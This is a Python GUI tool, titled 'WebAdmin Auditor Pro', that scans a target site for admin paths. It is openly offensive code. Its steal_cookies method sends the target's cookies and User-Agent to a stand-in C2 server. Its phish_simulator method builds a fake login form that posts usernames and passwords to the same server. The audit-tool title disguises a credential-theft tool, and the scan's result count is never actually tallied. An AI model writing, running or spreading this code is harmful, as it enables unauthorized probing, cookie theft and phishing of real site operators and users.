import tkinter as tk
import requests
import threading
from tkinter import ttk, messagebox
import sys
import os
import re
import time
import webbrowser
import tempfile
from bs4 import BeautifulSoup

class AdminHunterX:
    def __init__(self, master):
        self.master = master
        self.master.title("WebAdmin Auditor Pro v9.11")
        self.master.geometry("800x600")
        self.master.resizable(False, False)
        
        self.exfil_url = "https://your-c2-server.com/log.php"
        self.common_paths = [
            "/admin", "/wp-admin", "/administrator",
            "/login", "/controlpanel", "/secret-area", "/dashboard",
            "/adm", "/manager", "/panel", "/staff"
        ]
        
        self.create_widgets()
        self.scan_active = False

    def create_widgets(self):
        style = ttk.Style()
        style.theme_use("clam")
        
        main_frame = ttk.Frame(self.master)
        main_frame.pack(pady=20, padx=20, fill=tk.BOTH, expand=True)
        
        # Input Frame
        input_frame = ttk.Frame(main_frame)
        input_frame.pack(fill=tk.X, pady=10)
        
        ttk.Label(input_frame, text="Target URL:").pack(side=tk.LEFT, padx=5)
        self.url_entry = ttk.Entry(input_frame, width=50)
        self.url_entry.pack(side=tk.LEFT, padx=5, expand=True, fill=tk.X)
        self.url_entry.insert(0, "http://")
        
        self.scan_btn = ttk.Button(input_frame, text="L33T SCAN", command=self.start_scan)
        self.scan_btn.pack(side=tk.LEFT, padx=5)
        
        self.back_btn = ttk.Button(input_frame, text="MAIN MENU", command=self.fake_main_menu)
        self.back_btn.pack(side=tk.LEFT, padx=5)
        
        # Results Frame
        results_frame = ttk.Frame(main_frame)
        results_frame.pack(fill=tk.BOTH, expand=True)
        
        self.result_tree = ttk.Treeview(results_frame, columns=("Status", "Type"), selectmode="extended")
        self.result_tree.heading("#0", text="URL")
        self.result_tree.heading("Status", text="Status")
        self.result_tree.heading("Type", text="Type")
        self.result_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        
        vsb = ttk.Scrollbar(results_frame, orient="vertical", command=self.result_tree.yview)
        vsb.pack(side=tk.RIGHT, fill=tk.Y)
        self.result_tree.configure(yscrollcommand=vsb.set)
        
        # Status Bar
        self.status_bar = ttk.Label(self.master, text="[+] Ready to pwn", anchor=tk.W)
        self.status_bar.pack(side=tk.BOTTOM, fill=tk.X)

    def start_scan(self):
        if not self.validate_url():
            return
            
        if self.scan_active:
            messagebox.showwarning("Scan Active", "A scan is already in progress!")
            return
            
        self.scan_active = True
        self.scan_btn.config(state=tk.DISABLED)
        self.status_bar.config(text="[+] Enumerating attack surface...")
        
        threading.Thread(target=self.admin_hunt, daemon=True).start()

    def admin_hunt(self):
        target = self.url_entry.get().strip()
        found = []
        
        for path in self.common_paths:
            try:
                url = target.rstrip('/') + path
                response = requests.get(url, timeout=10, allow_redirects=True)
                
                if response.status_code == 200 and self.is_admin_page(response):
                    self.add_result(url, response.status_code, "High Confidence")
                    self.steal_cookies(response)
                    if "login" in path:
                        self.phish_simulator(url)
                elif 300 <= response.status_code < 400:
                    final_url = response.headers['Location']
                    if any(p in final_url for p in self.common_paths):
                        self.add_result(final_url, response.status_code, "Redirect")
                else:
                    self.add_result(url, response.status_code, "Not Found")
            except Exception as e:
                self.add_result(url, "Error", str(e))
        
        self.scan_active = False
        self.scan_btn.config(state=tk.NORMAL)
        self.status_bar.config(text=f"[+] Scan completed - {len(found)} potential admin pages found")

    def add_result(self, url, status, type_):
        self.master.after(0, self.result_tree.insert, "", "end", 
                        {"text": url, "values": (status, type_)})

    def is_admin_page(self, response):
        keywords = ['login', 'admin', 'dashboard', 'control panel']
        content = response.text.lower()
        return any(keyword in content for keyword in keywords)

    def steal_cookies(self, response):
        cookies = response.cookies.get_dict()
        if not cookies:
            return
            
        data = {
            "target": self.url_entry.get(),
            "cookies": str(cookies),
            "user-agent": response.request.headers['User-Agent']
        }
        
        try:
            requests.post(self.exfil_url, data=data, timeout=5)
        except:
            pass

    def phish_simulator(self, url):
        html_content = f"""
        <html>
            <body style='font-family: Arial, sans-serif; padding: 20px;'>
                <h2>Login Required</h2>
                <form action='{self.exfil_url}' method='POST'>
                    Username: <input type='text' name='creds'><br><br>
                    Password: <input type='password' name='creds'><br><br>
                    <input type='submit' value='Authenticate'>
                </form>
            </body>
        </html>
        """
        
        with tempfile.NamedTemporaryFile('w', delete=False, suffix='.html') as tmp:
            tmp.write(html_content)
            webbrowser.open(f'file://{tmp.name}')

    def fake_main_menu(self):
        messagebox.showinfo("LOL", r"Feature not implemented\n¯\_(ツ)_/¯")

    def validate_url(self):
        url = self.url_entry.get().strip()
        regex = re.compile(
            r'^(http|https)://'
            r'([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})'
            r'(:\d+)?'
            r'(/.*)?$'
        )
        if not regex.match(url):
            messagebox.showerror("Invalid URL", "Please enter a valid URL (e.g., http://example.com)")
            return False
        return True

if __name__ == "__main__":
    try:
        root = tk.Tk()
        app = AdminHunterX(root)
        root.mainloop()
    except Exception as e:
        messagebox.showerror("Fatal Error", f"Application crashed: {str(e)}")
